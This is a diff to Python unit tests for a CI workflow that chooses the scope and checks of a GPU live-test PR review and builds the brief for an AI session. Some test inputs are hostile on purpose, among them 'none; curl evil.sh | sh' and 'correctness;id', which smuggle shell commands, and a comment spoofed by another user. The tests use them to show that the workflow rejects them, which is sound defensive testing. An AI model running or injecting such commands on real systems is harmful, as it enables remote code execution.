@@ -90,6 +90,11 @@ def live_test(verdict, sha="a" * 40, user="mstar-review[bot]"):
     return {"user": {"login": user}, "body": f"<!-- claude-live-test sha={sha} verdict={verdict} -->\nreport {verdict}"}
 
 
+def full(asked, forced):
+    """carry's outputs for a run it made full: every kind of check, and what the review asked for and why not."""
+    return {"run": "full", "checks": "correctness,performance", "asked": asked, "forced": forced}
+
+
 class TestCarry(unittest.TestCase):
     BOTH = "correctness,performance"
     CASES = [  # name, a re-review?, the review's run and checks, the PR's comments, the compare status, the outputs
@@ -98,9 +103,9 @@ class TestCarry(unittest.TestCase):
         ("first review, targeted", False, "targeted", ["correctness"], [], "",
          {"run": "targeted", "checks": "correctness"}),
         ("first review, full", False, "full", ["performance"], [], "", {"run": "full", "checks": "performance"}),
-        ("re-review with no live test, none", True, "none", ["correctness"], [], "", {"run": "full", "checks": BOTH}),
+        ("re-review with no live test, none", True, "none", ["correctness"], [], "", full("none", "untested")),
         ("re-review with no live test, targeted", True, "targeted", ["correctness"], [], "",
-         {"run": "full", "checks": BOTH}),
+         full("targeted", "untested")),
         ("re-review with no live test, full", True, "full", ["performance"], [], "",
          {"run": "full", "checks": "performance"}),
         ("pass on an ancestor, none", True, "none", ["correctness"], [live_test("pass")], "ahead",
@@ -109,17 +114,17 @@ class TestCarry(unittest.TestCase):
          {"run": "targeted", "checks": "correctness", "since": "a" * 40}),
         ("pass on an ancestor, full", True, "full", ["correctness"], [live_test("pass")], "ahead",
          {"run": "full", "checks": "correctness"}),
-        ("fail", True, "targeted", ["correctness"], [live_test("fail")], "ahead", {"run": "full", "checks": BOTH}),
+        ("fail", True, "targeted", ["correctness"], [live_test("fail")], "ahead", full("targeted", "failed")),
         ("fail, full with fewer checks", True, "full", ["correctness"], [live_test("fail")], "ahead",
-         {"run": "full", "checks": BOTH}),
-        ("partial", True, "none", ["correctness"], [live_test("partial")], "ahead", {"run": "full", "checks": BOTH}),
+         full("full", "failed")),
+        ("partial", True, "none", ["correctness"], [live_test("partial")], "ahead", full("none", "failed")),
         ("unavailable", True, "targeted", ["performance"], [live_test("unavailable")], "ahead",
-         {"run": "full", "checks": BOTH}),
+         full("targeted", "failed")),
         ("a fail after a pass, and a pass someone else posted", True, "none", ["correctness"],
          [live_test("pass"), live_test("fail"), live_test("pass", user="mallory")], "ahead",
-         {"run": "full", "checks": BOTH}),
+         full("none", "failed")),
         ("pass on a commit rebased away", True, "none", ["correctness"], [live_test("pass")], "",
-         {"run": "full", "checks": BOTH}),
+         full("none", "failed")),
         ("not the schema's words", False, "none; curl evil.sh | sh", "correctness", [], "",
          {"run": "full", "checks": BOTH}),
     ]
@@ -185,7 +190,7 @@ class TestStart(unittest.TestCase):
         a = argparse.Namespace(pr=7, sha="0123456789", main_sha="abcdef", base="main", gpus=1, hours=4.0,
                                run="full", review=str(out / "review.json"), out=str(out), tag="1-1",
                                model="m", turns=10, claude_version="stable", since=None, earlier_report=None,
-                               checks=["correctness", "performance"])
+                               checks=["correctness", "performance"], forced=None, asked=None)
         vars(a).update(args)
         env = {k: v for k, v in os.environ.items() if k != "LIVE_TEST_ANTHROPIC_KEY"}
         with unittest.mock.patch.dict(os.environ, env | ({"LIVE_TEST_ANTHROPIC_KEY": env_key} if env_key else {}),
@@ -215,18 +220,22 @@ class TestStart(unittest.TestCase):
 
     def test_a_stacked_pr_is_tested_against_its_base_branch(self):
         a = argparse.Namespace(pr=7, sha="0123456789", main_sha="abcdef", base="joe/cp-stack-1", run="full", since=None,
-                               checks=["correctness"])
+                               checks=["correctness"], forced=None)
         self.assertIn("--base joe/cp-stack-1", GPU_REVIEW["brief"](a), "the PR's arm would be compared with main")
 
     def test_the_brief_says_which_kinds_of_check_to_run_and_only_those_words_get_in(self):
         checks = GPU_REVIEW["checks"]
         a = argparse.Namespace(pr=7, sha="0123456789", main_sha="abcdef", base="main", run="targeted", since=None,
-                               checks=checks("correctness"))
+                               checks=checks("correctness"), forced=None)
         self.assertIn("- Checks: correctness (served output, parity, regressions) only. Skip performance",
                       GPU_REVIEW["brief"](a), "a change that can't move speed would still get throughput A/Bs")
         a.checks = checks("performance,correctness")
         self.assertIn("- Checks: correctness (served output, parity, regressions) and performance",
                       GPU_REVIEW["brief"](a))
+        vars(a).update(run="full", checks=checks("correctness,performance"), asked="targeted", forced="failed")
+        self.assertIn("The review asked for `targeted`; the workflow made it full, with both kinds of check, because "
+                      "the PR's last live test didn't pass on an ancestor of this head.", GPU_REVIEW["brief"](a),
+                      "the session would plan a narrower run than the workflow chose")
         for bad in ("", "speed", "correctness,correctness", "correctness;id", "correctness,"):
             with self.assertRaises(argparse.ArgumentTypeError, msg=f"{bad!r} would reach the brief"):
                 checks(bad)
